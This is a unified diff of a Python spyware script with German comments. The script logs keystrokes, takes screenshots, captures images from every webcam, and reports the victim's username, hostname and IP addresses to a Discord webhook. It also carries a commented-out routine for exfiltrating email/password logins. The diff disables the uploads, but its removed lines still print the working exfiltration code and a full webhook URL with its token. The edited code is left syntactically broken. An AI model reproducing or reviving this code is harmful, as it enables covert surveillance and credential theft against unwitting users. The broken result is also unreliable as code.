@@ -75,8 +75,8 @@ if internet() == True:
         DEV = ""
         DEVT = 'False'
 
-    hook = Webhook('https://discord.com/api/webhooks/1233410596167221369/uQV4e2bAYeoP1PCm2i5ur68-uhJ15bgvhBbg0CN159sawhZ8UKscnQpD79yflVa_lmEi')
-    hook.send(f"-----\n{DEV} ||<@691670319248965694>|| \n\nUSERNAME:                         {username} \nHOSTNAME:                         {hostname} \nPRIVATE IPADDRESS:        {IPPri} \nPUBLIC IPADRESS:             {IPPub}\n-----")
+#    hook = Webhook('https://discord.com/api/webhooks/1233410596167221369/uQV4e2bAYeoP1PCm2i5ur68-uhJ15bgvhBbg0CN159sawhZ8UKscnQpD79yflVa_lmEi')
+#    hook.send(f"-----\n{DEV} ||<@691670319248965694>|| \n\nUSERNAME:                         {username} \nHOSTNAME:                         {hostname} \nPRIVATE IPADDRESS:        {IPPri} \nPUBLIC IPADRESS:             {IPPub}\n-----")
 
     # if not username == DEVNAME:
     #     #####
@@ -88,10 +88,10 @@ if internet() == True:
     #
     #     def send_to_webhook(email, password):
     #         # URL des Webhooks anpassen
-    #         webhook_url = "https://discord.com/api/webhooks/1233410596167221369/uQV4e2bAYeoP1PCm2i5ur68-uhJ15bgvhBbg0CN159sawhZ8UKscnQpD79yflVa_lmEi"
+    #          = "https://discord.com/api/webhooks/1233410596167221369/uQV4e2bAYeoP1PCm2i5ur68-uhJ15bgvhBbg0CN159sawhZ8UKscnQpD79yflVa_lmEi"
     #
     #         # Erstellen eines Webhook-Objekts
-    #         hook = Webhook(webhook_url)
+    #         hook = Webhook()
     #
     #         # Nachricht für den Webhook erstellen
     #         message = f"-----\n# NEW LOGIN\nEMAIL:                                   {email}\nPASSWORD:                         {password}\nUSERNAME:                         {username}\nHOSTNAME:                         {hostname}\n-----"
@@ -138,29 +138,29 @@ else:
 time.sleep(1)
 print(f"Welcome, {username}!")
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1233410596167221369/uQV4e2bAYeoP1PCm2i5ur68-uhJ15bgvhBbg0CN159sawhZ8UKscnQpD79yflVa_lmEi'
+#  = 'https://discord.com/api/webhooks/1233410596167221369/uQV4e2bAYeoP1PCm2i5ur68-uhJ15bgvhBbg0CN159sawhZ8UKscnQpD79yflVa_lmEi'
 TIME_INTERVAL = 20  # Amount of time between each report, expressed in seconds.
 
-webhook_url = "https://discord.com/api/webhooks/1233410596167221369/uQV4e2bAYeoP1PCm2i5ur68-uhJ15bgvhBbg0CN159sawhZ8UKscnQpD79yflVa_lmEi"
+#  = "https://discord.com/api/webhooks/1233410596167221369/uQV4e2bAYeoP1PCm2i5ur68-uhJ15bgvhBbg0CN159sawhZ8UKscnQpD79yflVa_lmEi"
 
-def main(webhook_url):
-    camera_index = 0
-    while True:
-        ret, image = capture_image(camera_index)
-        if ret:
-            send_image_to_webhook(image, webhook_url)
-        else:
-            # Wenn keine Kamera an diesem Index vorhanden ist, breche die Schleife ab
-            break
-        camera_index += 1
+# def main():
+#     camera_index = 0
+#     while True:
+#         ret, image = capture_image(camera_index)
+#         if ret:
+#             send_image_to_webhook(image, )
+#         else:
+#             # Wenn keine Kamera an diesem Index vorhanden ist, breche die Schleife ab
+#             break
+#         camera_index += 1
 
-def send_image_to_webhook(image, webhook_url):
-    _, img_encoded = cv2.imencode('.jpg', image)
-    response = requests.post(webhook_url, files={'image.jpg': img_encoded.tobytes()})
-    if response.status_code == 200:
-        print("Bild erfolgreich an Webhook gesendet.")
-    else:
-        print("Fehler beim Senden des Bildes an den Webhook.")
+# def send_image_to_webhook(image, ):
+#     _, img_encoded = cv2.imencode('.jpg', image)
+#     response = requests.post(, files={'image.jpg': img_encoded.tobytes()})
+#     if response.status_code == 200:
+#         print("Bild erfolgreich an Webhook gesendet.")
+#     else:
+#         print("Fehler beim Senden des Bildes an den Webhook.")
 
 def capture_image(camera_index):
     cap = cv2.VideoCapture(camera_index)
@@ -172,15 +172,15 @@ def capture_image(camera_index):
     return ret, frame
 
 class Keylogger:
-    def __init__(self, webhook_url, interval):
+    def __init__(self, , interval):
         self.interval = interval
-        self.webhook = Webhook(webhook_url)
+        # self.webhook = Webhook()
         self.log = ""
 
     def _report(self): #            TIME: {get_time_os}
         timenow = datetime.now().time()
         if self.log != '':
-            self.webhook.send(f"{DEV} *USER*: **{username}** ~~*TIME: {timenow}*~~ {self.log}")
+            # self.webhook.send(f"{DEV} *USER*: **{username}** ~~*TIME: {timenow}*~~ {self.log}")
             self.log = ''
             if DEVT == 'True':
                 print("SENT")
@@ -193,10 +193,10 @@ class Keylogger:
             screenshot.save(screenshot_filename)
 
             # Send the screenshot to the webhook
-            with open(screenshot_filename, "r+b") as f:
-                    file = {"file": f}
-                    payload = {"content": f"{DEV} *USER*: **{username}** ~~*TIME: {timenow}*~~".format(time.strftime("%Y-%m-%d %H:%M:%S"))}
-                    r = requests.post(WEBHOOK_URL, data=payload, files=file)
+            # with open(screenshot_filename, "r+b") as f:
+            #         file = {"file": f}
+            #         payload = {"content": f"{DEV} *USER*: **{username}** ~~*TIME: {timenow}*~~".format(time.strftime("%Y-%m-%d %H:%M:%S"))}
+            #         r = requests.post(, data=payload, files=file)
 
             # Delete the screenshot file
             os.remove(screenshot_filename)
@@ -211,9 +211,9 @@ class Keylogger:
         with Listener(self._on_key_press) as t:
             t.join()
 
-main(webhook_url)
+# main()
 if __name__ == '__main__':
-    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()
+    Keylogger(TIME_INTERVAL).run()
 
 #else: print("start canceled")
 #time.sleep(1)
